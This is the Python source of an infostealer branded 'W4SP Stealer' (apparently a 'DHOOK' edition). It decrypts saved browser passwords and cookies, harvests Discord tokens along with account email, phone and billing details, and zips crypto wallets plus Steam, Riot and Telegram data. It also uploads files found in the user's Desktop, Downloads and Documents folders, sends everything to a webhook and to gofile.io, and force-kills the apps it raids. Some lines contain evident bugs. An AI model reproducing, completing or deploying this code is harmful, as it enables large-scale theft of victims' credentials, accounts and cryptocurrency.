import contextlib
import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess

#    THIS IS 1.1.6 VERSION DHOOK BY ASPELL
#   BY W4SP, loTus04 (and Aspell for DHOOK)
#          Edited with love ❤


hook = "WEBHOOK_HERE"


DETECTED = False


def getip():
    ip = "None"
    with contextlib.suppress(Exception):
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts in ['v10', 'v11']:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def LoadRequests(methode, url, data='', files='', headers=''):
    for _ in range(8):
        with contextlib.suppress(Exception):
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code in {200, 413}: # 413 = DATA TO BIG
                        return r

def LoadUrlib(hook, data='', files='', headers=''):
    for _ in range(8):
        with contextlib.suppress(Exception):
            return (
                urlopen(Request(hook, data=data, headers=headers))
                if headers != ''
                else urlopen(Request(hook, data=data))
            )
        
def dhook(dhook, data='', files='', headers=''):
    for _ in range(8):
        with contextlib.suppress(Exception):
            return (
                urlopen(Request(dhook, data=data, headers=headers))
                if headers != ''
                else urlopen(Request(dhook, data=data))
            )

def globalInfo():
    ip = getip()
    username = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    return f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"


def Trust(Cookies):
    # simple Trust Factor system (disabled for the moment)
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    DETECTED = len(tim) < -1
    return DETECTED
        
def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except Exception:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if "House" not in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except Exception:
        return False

    if billingjson == []: return " -"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing


def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    phone = f'`{userjson["phone"]}`' if "phone" in userjson else "-"
    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except Exception:
        return False


def uploadToken(token, path):
    global hook
    global dhook
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

    if pfp is None: 
        pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = GetBilling(token)
    badge = GetBadge(flags)
    friends = GetUHQFriends(token)
    if friends == '': friends = "No Rare Friends"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = " -"

    data = {
        "content": f'{globalInfo()} | Found in `{path}`',
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                    "name": ":rocket: Token:",
                    "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
                },
                {
                    "name": ":envelope: Email:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": ":mobile_phone: Phone:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                    "name": ":globe_with_meridians: IP:",
                    "value": f"`{getip()}`",
                    "inline": True
                },
                {
                    "name": ":beginner: Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": ":credit_card: Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": ":clown: HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "@W4SP STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
        "username": "W4SP Stealer",
        "attachments": []
        }
    # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
    dhook(dhook, data=dumps(data).encode(), headers=headers)
def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "wpcook":
        rb = ' | '.join(cookiWords)
        if len(rb) > 1000: 
            rrrrr = Reformat(str(cookiWords))
            rb = ' | '.join(rrrrr)
        data = {
            "content": globalInfo(),
            "embeds": [
                {
                    "title": "W4SP | Cookies Stealer",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [w4spCookies.txt]({link})",
                    "color": 14406413,
                    "footer": {
                        "text": "@W4SP STEALER",
                        "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
                    }
                }
            ],
            "username": "W4SP",
            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        dhook(dhook, data=dumps(data).encode(), headers=headers)
        return

    if name == "wppassw":
        ra = ' | '.join(paswWords)
        if len(ra) > 1000: 
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(rrr)

        data = {
            "content": globalInfo(),
            "embeds": [
                {
                    "title": "W4SP | Password Stealer",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [w4spPassword.txt]({link})",
                    "color": 14406413,
                    "footer": {
                        "text": "@W4SP STEALER",
                        "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
                    }
                }
            ],
            "username": "W4SP",
            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        dhook(dhook, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": globalInfo(),
            "embeds": [
                {
                "color": 14406413,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "W4SP | File Stealer"
                },
                "footer": {
                    "text": "@W4SP STEALER",
                    "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
                }
                }
            ],
            "username": "W4SP",
            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        dhook(dhook, data=dumps(data).encode(), headers=headers)
        return



# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)

def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--W4SP STEALER ON TOP-->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

Tokens = ''
def getToken(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token) and token not in Tokens:
                            # print(token)
                            Tokens += token
                            uploadToken(token, path)

Passw = []
def getPassw(path, arg):
    global Passw, PasswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = (
        f"{temp}wp"
        + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
        + ".db"
    )

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = f"{path}/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0] and old not in paswWords:
                    paswWords.append(old)
            Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
            PasswCount += 1
    writeforfile(Passw, 'passw')

Cookies = []    
def getCookie(path, arg):
    global Cookies, CookiCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return

    tempfold = (
        f"{temp}wp"
        + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
        + ".db"
    )

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = f"{path}/Local State"

    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0] and old not in cookiWords:
                    cookiWords.append(old)
            Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}")
            CookiCount += 1
    writeforfile(Cookies, 'cook')

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = f"{path}/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)

    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded) and tokenDecoded not in Tokens:
                        # print(token)
                        Tokens += tokenDecoded
                        # writeforfile(Tokens, 'tokens')
                        uploadToken(tokenDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)

    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
    wal, ga, ot = "",'',''
    if len(WalletsZip) != 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if len(GamingZip) != 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if len(OtherZip) != 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "W4SP Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 15781403,
            "footer": {
                "text": "@W4SP STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
            }
            }
        ],
        "username": "W4SP Stealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
        "attachments": []
    }
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
    dhook(dhook, data=dumps(data).encode(), headers=headers)

def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.pathC.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if (
            ".zip" not in file
            and "tdummy" not in file
            and "user_data" not in file
            and "webview" not in file
        ): 
            zf.write(f"{pathC}/{file}")
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
#     lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg

    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        found = any('RememberPassword"\t\t"1"' in l for l in data)
        if not found: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if ".zip" not in file:
            zf.write(f"{pathC}/{file}")
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
#     lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True: return

    # for patt in browserPaths:
    #     threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
    
    # for patt in PathsToZip:
    #     threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
    
    # threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["wppassw.txt", "wpcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(f"{pathF}/{file}"): return
        i += 1
        if i > maxfilesperdir:
            break
        url = uploadToAnonfiles(f"{pathF}/{file}")
        ffound.append([f"{pathF}/{file}", url])
    KiwiFiles.append(["folder", f"{pathF}/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(f"{path}/{file}") and ".txt" in file:
                    fifound.append([f"{path}/{file}", uploadToAnonfiles(f"{path}/{file}")])
                    break
                if os.path.isdir(f"{path}/{file}"):
                    target = f"{path}/{file}"
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [f"{user}/Desktop", f"{user}/Downloads", f"{user}/Documents"]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret"

    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]                   
